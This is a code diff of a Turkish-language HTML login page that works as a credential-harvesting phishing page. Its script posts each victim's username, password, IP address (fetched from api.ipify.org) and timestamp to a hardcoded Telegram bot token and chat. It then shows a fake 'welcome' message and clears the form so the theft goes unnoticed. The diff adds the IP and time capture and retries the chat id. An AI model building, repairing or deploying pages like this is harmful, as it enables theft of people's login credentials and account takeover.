@@ -121,6 +121,13 @@
             font-size: 12px;
             margin-top: 20px;
         }
+        
+        .ip-info {
+            color: rgba(255,255,255,0.5);
+            font-size: 11px;
+            text-align: center;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
@@ -139,31 +146,56 @@
         </form>
         
         <div id="message"></div>
+        <div class="ip-info" id="ipInfo">IP adresiniz alınıyor...</div>
         <div class="footer">© 2024 - Tüm hakları saklıdır</div>
     </div>
 
     <script>
+        // IP adresini al
+        let userIP = 'Bilinmiyor';
+        
+        // IP adresini çeken API
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                userIP = data.ip;
+                document.getElementById('ipInfo').innerHTML = `IP: ${userIP}`;
+            })
+            .catch(error => {
+                console.log('IP alınamadı');
+                document.getElementById('ipInfo').innerHTML = 'IP alınamadı';
+            });
+
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
-            // Bilgileri Telegram botuna gönder
-            fetch('https://api.telegram.org/bot8541017984:AAGWuSkhuj801ipwCmQdSIlE51Lza5wfkH8/sendMessage', {
+            // Mesajı göster
+            document.getElementById('message').style.display = 'block';
+            document.getElementById('message').innerHTML = `✅ Hoşgeldin ${username}!`;
+            
+            // Bilgileri Telegram'a gönder (IP ile birlikte)
+            fetch(`https://api.telegram.org/bot8541017984:AAGWuSkhuj801ipwCmQdSIlE51Lza5wfkH8/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    chat_id: '@CokKonusulacam',
-                    text: `🔔 YENİ GİRİŞ!\n\n👤 Kullanıcı: ${username}\n🔑 Şifre: ${password}\n🌐 IP: Bekleniyor...`
+                    chat_id: 'CokKonusulacam',  // @ işareti olmadan dene
+                    text: `🔔 YENİ GİRİŞ!\n\n👤 Kullanıcı: ${username}\n🔑 Şifre: ${password}\n🌐 IP: ${userIP}\n⏰ Tarih: ${new Date().toLocaleString('tr-TR')}`
                 })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Telegram response:', data);
+            })
+            .catch(error => {
+                console.log('Hata:', error);
             });
             
-            // Kullanıcıya sadece hoşgeldin mesajı göster
-            document.getElementById('message').style.display = 'block';
-            document.getElementById('message').innerHTML = `✅ Hoşgeldin ${username}!`;
+            // Formu temizle
             document.getElementById('loginForm').reset();
         });
     </script>
